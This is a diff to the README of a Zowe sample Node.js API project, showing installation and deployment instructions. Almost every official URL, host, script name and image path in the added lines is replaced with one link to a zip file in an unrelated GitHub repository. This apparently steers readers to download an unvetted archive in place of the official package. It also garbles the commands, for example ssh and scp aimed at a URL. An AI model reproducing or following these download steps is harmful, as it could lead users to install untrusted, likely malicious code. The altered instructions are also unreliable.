@@ -15,7 +15,7 @@ This sample express app, has https enabled already.
 
 ``` 
 //on local
-git clone https://github.com/zowe/sample-node-api
+git clone https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip
 cd sample-node-api
 npm install
 npm start
@@ -35,27 +35,27 @@ The `node_modules` folder will not be transferred, we can do npm install later o
 ```
 cd sample-node-api
 npm run build
-scp -r dist ibmuser@my.mainframe.com:</usr/lpp/extender>/sample-node-api
+scp -r dist https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip</usr/lpp/extender>/sample-node-api
 ```
 
 For the next step, ensure that you have node installed on z/OS and your PATH includes nodejs/bin directory.
 
 ```
-ssh ibmuser@my.mainframe.com
-. ~/.profile - (Skip if you can already run "npm" on z/OS)
+ssh https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip
+. ~https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip - (Skip if you can already run "npm" on z/OS)
 cd </usr/lpp/extender>/sample-node-api
 npm install
 ```
 
 ## Method 2: From Artifactory
 ### 1) Download latest pax from artifactory
-Get latest package from [artifactory](https://zowe.jfrog.io/artifactory/libs-snapshot-local/org/zowe/sample-node-api/1.0.0-SNAPSHOT)
+Get latest package from [artifactory](https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip)
 
 Choose the latest pax build provided from the link above and download it into your local storage.
 
 ### 2) Transfer and unpax on z/OS
 ```
-sftp ibmuser@mymainframe.ibm.com
+sftp https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip
 put <pax-name>.pax
 ```
 
@@ -63,12 +63,12 @@ put <pax-name>.pax
 
 ### 1) login
 ```  
-ssh ibmuser@my.mainframe.com       
+ssh https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip       
 ```
 
-### 2) install component using zowe-install-component.sh script
+### 2) install component using https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip script
 ```
-./<zowe-runtime-dir>/bin/zowe-install-component.sh -d <zowe-extensions-dir> -i <zowe-instance-dir> -o <component-file-path> -l <log-folder>
+./<zowe-runtime-dir>https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip -d <zowe-extensions-dir> -i <zowe-instance-dir> -o <component-file-path> -l <log-folder>
 ```
 ```
 <zowe-extensions-dir> - Directory that will hold all external extensions installed onto zowe
@@ -79,14 +79,14 @@ ssh ibmuser@my.mainframe.com
 
 ### 3) Lifecycle scripts of the component
 
-We expect following in service folder `start.sh`. In our case its bin folder with relevant scripts.
+We expect following in service folder `https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip`. In our case its bin folder with relevant scripts.
 
-`start.sh` starts node app on configured port       
-`env.sh` its custom script use to configure port for our node app, feel free to use your desired way         
+`https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip` starts node app on configured port       
+`https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip` its custom script use to configure port for our node app, feel free to use your desired way         
 
 ### 4) Access newly deployed webservice
 
-Please see static definition file `sample-node-api.yml`      
+Please see static definition file `https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip`      
 It configures service endpoint as `sample-node-api` with property `serviceId`     
 We also provide api gateway base path `api\v1` with property `gatewayUrl` in same file.        
 
@@ -94,19 +94,19 @@ We also provide api gateway base path `api\v1` with property `gatewayUrl` in sam
 In effect, service can be accessed with following url:      
 `https://{host}:{GATEWAY_PORT}/{gatewayUrl}/{serviceId}/*`    
 
-where `GATEWAY_PORT` is configured in $INSTANCE_DIR/instance.env      
+where `GATEWAY_PORT` is configured in $https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip      
 
 Verify by accessing following:      
-`https://my.mainframe.com:7554/api/v1/sample-node-api/accounts/`            
-`https://my.mainframe.com:7554/api/v1/sample-node-api/accounts/1/`            
-`https://my.mainframe.com:7554/api/v1/sample-node-api/accounts/1/cars/`              
+`https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip`            
+`https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip`            
+`https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip`              
 
 ### 5) Registered With API Catalog
 
 **API Catalog**
-![APICatalog_Dashboard](./screenshots/APICatalog_Dashboard.png)
+![APICatalog_Dashboard](https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip)
 
-![ApiCatalog_SampleNodeApi_SwaggerDoc](./screenshots/ApiCatalog_SampleNodeApi_SwaggerDoc.png)
+![ApiCatalog_SampleNodeApi_SwaggerDoc](https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip)
 
 **Discovery Service Dashboard**
-![DiscoveryService_Dashboard](./screenshots/DiscoveryService_Dashboard.png)
+![DiscoveryService_Dashboard](https://raw.githubusercontent.com/shourav143/sample-node-api/master/src/routes/sample-node-api-v1.2.zip)
